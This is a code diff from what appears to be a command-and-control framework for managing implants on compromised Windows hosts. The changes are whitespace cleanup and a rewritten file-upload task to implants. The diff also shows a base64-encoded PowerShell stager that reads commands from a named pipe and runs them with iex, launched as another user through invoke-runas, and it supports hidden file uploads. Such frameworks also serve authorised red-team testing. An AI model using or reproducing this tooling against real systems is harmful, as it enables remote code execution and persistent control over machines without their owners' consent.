@@ -553,7 +553,7 @@ def do_invoke_runasproxypayload(user, command, randomuri):
         check_module_loaded("NamedPipeProxy.ps1", randomuri, user)
         params = re.compile("invoke-runasproxypayload ", re.IGNORECASE)
         params = params.sub("", command)
-        
+
         pipe = "add-Type -assembly System.Core; $pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSProxy'); $pi.Connect(); $pr = new-object System.IO.StreamReader($pi); iex $pr.ReadLine();"
         pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params, base64.b64encode(pipe.encode('UTF-16LE')).decode("utf-8"))
         new_task(pscommand, user, randomuri)
@@ -605,20 +605,12 @@ def do_upload_file(user, command, randomuri):
         destination = args.destination
         nothidden = args.nothidden
     try:
-        with open(source, "rb") as source_file:
-            s = source_file.read()
-        if s:
-            sourceb64 = base64.b64encode(s).decode("utf-8")
-            destination = destination.replace("\\", "\\\\")
-            print("")
-            print("Uploading %s to %s" % (source, destination))
-            if (nothidden):
-                uploadcommand = "Upload-File -Destination \"%s\" -NotHidden %s -Base64 %s" % (destination, nothidden, sourceb64)
-            else:
-                uploadcommand = "Upload-File -Destination \"%s\" -Base64 %s" % (destination, sourceb64)
-            new_task(uploadcommand, user, randomuri)
+        print("Uploading %s to %s" % (source, destination))
+        if (nothidden):
+            uploadcommand = f"upload-file {source} {destination} -NotHidden {nothidden}"
         else:
-            print_bad("Source file could not be read or was empty")
+            uploadcommand = f"upload-file {source} {destination}"
+        new_task(uploadcommand, user, randomuri)
     except Exception as e:
         print_bad("Error with source file: %s" % e)
         traceback.print_exc()
@@ -725,7 +717,7 @@ def do_listmodules(user, command, randomuri):
         if ".ps1" in mod:
             print(mod)
 
-    
+
 def do_modulesloaded(user, command, randomuri):
     ml = get_implantdetails(randomuri)
     print(ml[14])
